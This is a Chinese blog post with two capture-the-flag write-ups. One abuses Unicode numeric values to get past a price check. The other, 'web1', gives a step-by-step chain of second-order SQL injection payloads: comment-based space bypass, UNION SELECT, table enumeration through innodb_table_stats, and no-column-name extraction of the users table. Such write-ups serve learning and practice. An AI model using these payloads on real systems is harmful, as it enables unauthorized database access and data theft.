      <title>Unicorn shop+Web1</title>
      <link href="/2020/11/22/article1/"/>
      <url>/2020/11/22/article1/</url>
      
        <content type="html"><![CDATA[<h1 id="一-Unicorn-shop"><a href="#一-Unicorn-shop" class="headerlink" title="一.Unicorn shop"></a>一.Unicorn shop</h1><h2 id="原理：Unicode数字显示漏洞"><a href="#原理：Unicode数字显示漏洞" class="headerlink" title="原理：Unicode数字显示漏洞"></a>原理：Unicode数字显示漏洞</h2><p>一些国家的数字在显示的时候可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4，详细原理参考<a href="https://xz.aliyun.com/t/5402#toc-0" target="_blank" rel="noopener">文章1</a>，<a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/" target="_blank" rel="noopener">文章2</a></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.Unicorn shop–独角兽商店，题目界面给出了4种独角兽的Price和Item ID，下面也有购买框，尝试进行购买，<img src="/../images/1.png" alt=""></p><p>前面三个独角兽按照给出的价格进行购买均购买失败，但是购买第四只时给出的错误信息有所不同</p><p><img src="/../images/2.png" alt=""></p><p>只允许一个字符，但是第四只独角兽的价格是1337,一个字符怎么能大于1337嘞？这里结合F12提示信息</p><p><img src="/../images/2020-11-22_21-12.png" alt=""></p><p>提示说页面采用utf-8编码方式，很重要，结合unicode数字显示漏洞–一个字符代表很大的数值，<a href="https://www.compart.com/en/unicode" target="_blank" rel="noopener">一个unicode转换网站</a>，去该网站搜索==thousand==，找到一个==numbric value==大于1337的unicode字符</p><p><img src="/../images/2020-11-22_21-37.png" alt=""></p><p>这个字符的实际数值是2000,大于1337，直接将它的UTF-8编码复制过来进行提交（注意将0x改为%），成功拿到flag。</p><h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>1.<a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">二次注入</a></p><p>2.<a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">无列名注入</a></p><p>3.<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">bypass information_schema</a></p><p>4.Innodb引擎的利用</p><h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.注册一个帐号后，在申请广告处存在sql注入漏洞，查看广告处存在二次注入漏洞，下图是我在申请广告名为==1‘==后进行查看得到的结果</p><p><img src="/../images/2020-11-22_22-29.png" alt="2020-11-22_22-29"></p><p>2.空格被过滤(因为在申请广告名中含有空格申请后看到的内容里面空格消失，但是可以采用注释符==/**/==绕过)；==or==也被过滤了(因为在提交含有or的广告名时会出现含有敏感词汇页面)，所以无法使用==order by==(可以使用==group by==来进行查询表列数），==information_schema==(可以使用==sys==代替它)；又因为注释符被过滤了，所以还要进行闭合。</p><p>3.`</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">.</span>查询列数：<span class="token number">1</span>‘<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">group</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">by</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">23</span><span class="token punctuation">,</span>'              <span class="token comment" spellcheck="true">---->得到前面select列数为23列;并且测试得到2,3号位为显示位</span><span class="token number">2</span><span class="token punctuation">.</span>查看数据库版本，和当前数据库<span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'                                <span class="token comment" spellcheck="true">---->当前数据库名：web1,数据库版本：10.2.26-MariaDB（该版本数据库无sys库，无法使用上面原理中提到的bypass，但是存在innodb引擎，所以可以利用innodb_table_stats表来代替information_schema）</span><span class="token number">3</span><span class="token punctuation">.</span>利用<span class="token keyword">innodb</span>引擎爆表<span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>mysql<span class="token punctuation">.</span>innodb_table_stats<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'      <span class="token comment" spellcheck="true">--->得到有5个表：FLAG_TABLE,news,users,ads,gtid_slave_pos</span><span class="token number">4</span><span class="token punctuation">.</span>无列名注入<span class="token number">4.1</span>爆表列数<span class="token comment" spellcheck="true">---->共三列</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token operator">*</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>users<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">group</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">by</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'<span class="token number">4.2</span>爆第一列<span class="token comment" spellcheck="true">--->1,1,2,3</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">a</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">b</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">c</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token operator">*</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>users<span class="token punctuation">)</span><span class="token number">d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'<span class="token number">4.3</span>爆第二列<span class="token comment" spellcheck="true">--->2,flag，admin，admin1</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">a</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">b</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">c</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token operator">*</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>users<span class="token punctuation">)</span><span class="token number">d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'<span class="token number">4.4</span>爆第三列<span class="token comment" spellcheck="true">--》拿到flag了</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span><span class="token number">c</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">a</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">b</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">c</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token operator">*</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>users<span class="token punctuation">)</span><span class="token number">d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'</code></pre><p>`</p><p>4.本机查看==innodb_table_stats表==和==innodb_index_stats==表</p><p><strong>MariaDB直到5.5版本，均依照MySql的版本，从2012.11起发布的10.0.0版开始，不再依照MySql版号，10.0.x版以5.5版为基础，加上移植MySql5.6版的功能和自行开发的新功能，在存储引擎方面，10.0.9版起使用Aria来代替Innodb，但是默认开启使用的是Innodb，而上述两个表都是从5.6.x开始自动设置的。</strong></p><p><img src="/../images/2020-11-23_04-04.png" alt="2020-11-23_04-04"></p><p>其中==innodb_index_stats==存储的是innodb引擎的库名，表名及其对应的索引名；==innodb_table_stats==存储的是innodb引擎的库名和表名</p><p><img src="/../images/2020-11-23_04-09.png" alt="2020-11-23_04-09"></p><p><img src="/../images/2020-11-23_04-10.png" alt="2020-11-23_04-10">)<img src="/../images/2020-11-23_04-10_1.png" alt="2020-11-23_04-10_1"></p><p>使用这两个表注入的缺点就是无法获得列名。</p><p>5.获得表名之后开始进行无列名注入。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
